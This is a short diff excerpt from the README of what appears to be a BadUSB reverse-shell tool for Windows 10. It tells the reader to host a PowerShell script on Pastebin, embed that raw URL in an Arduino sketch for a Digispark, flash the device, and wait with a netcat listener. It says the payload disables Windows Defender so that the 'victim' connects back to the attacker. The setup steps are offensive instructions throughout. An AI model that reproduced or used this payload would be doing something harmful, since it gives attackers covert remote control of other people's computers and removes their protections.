@@ -8,7 +8,7 @@ A simple payload to get reverse shell in seconds. Supports Windows 10.
 2. Upload remotescript.PS1 to Pastebin and grab raw paste link. 
 3. Replace 'REMOTESCRIPTURL' with your Pastebin raw URL on line 37 in 'flash.ino'
 4. Open and upload 'flash.ino' via Arduino IDE to your Digispark.
-5. Listen for connections using Netcat. `nc -lp PORT`
+5. Listen for connections using Netcat. `nc -v -n -l -p PORT`
 
 ## What it Does
 - Disables Windows Defender to allow the Reverse Shell connection between the victim and server.
